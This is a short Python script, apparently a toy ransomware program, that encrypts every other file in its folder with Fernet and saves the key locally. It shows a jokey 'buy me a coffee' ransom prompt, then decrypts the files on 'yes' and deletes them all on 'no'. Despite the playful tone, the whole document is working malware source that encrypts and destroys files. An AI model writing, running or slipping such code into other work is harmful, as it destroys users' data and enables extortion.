#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

criticFiles = ["Ransomware.py", "key.txt"]
fileList = []


def dirFiles():
    global fileList
    for file in os.listdir():
        if file in criticFiles:
            continue
        if os.path.isfile(file):
            fileList.append(file)


# Encryptor
def encrypt():
    key = Fernet.generate_key()

    with open("key.txt", "wb") as file:
        file.write(key)

    for file in fileList:
        with open(file, "rb") as currfile:
            content = currfile.read()
        encrpytedContent = Fernet(key).encrypt(content)
        with open(file, "wb") as samefile:
            samefile.write(encrpytedContent)


# Decryptor
def decrypt():
    with open("key.txt", "rb") as key:
        secret = key.read()

    for file in fileList:
        with open(file, "rb") as currfile:
            contents = currfile.read()
        decryptedContent = Fernet(secret).decrypt(contents)
        with open(file, "wb") as samefile:
            samefile.write(decryptedContent)


# main
if __name__ == "__main__":
    dirFiles()
    encrypt()

    logo = """			    ___ ___   ____   __    __   _____    _
			   |         |    | |  |  |  | |        | |
			   |   ____  | || | |  \\  |  | |_____   | |
			   |       | | || | |  |\\ |  | |        | |
			   |_______| |____| |__| \\|__| |_____    0
	"""

    print("\033[1;31m " + logo + "\n")
    print(
        "\033[1;35mHola, If you are seeing this, that means all your files in this folder are encrypted \U0001F92B"
    )
    print("The encrypted files are")
    for file in fileList:
        print(file)
    print("If you wanna decrypt the files, buy me a coffee \U0001f61D")
    nextIter = True
    while nextIter:
        willing = input("Willing to buy me a coffee (y/n): ")
        if willing.lower() == "y" or willing.lower() == "yes":
            decrypt()
            print("\033[1;32mSuccess!")
            print("All your files are decryped!!!")
            print("Bye!")
            nextIter = False
        elif willing.lower() == "n" or willing.lower() == "no":
            print(
                "\033[1;31mThis is too bad...You can't buy me a cup of coffee...I am hurt..."
            )
            print("Deleting your files...")
            for file in fileList:
                os.remove(file)
            print("All your files are gone. Bye!")
            nextIter = False
        else:
            print("Something wrong you chose")
            print("Try again")
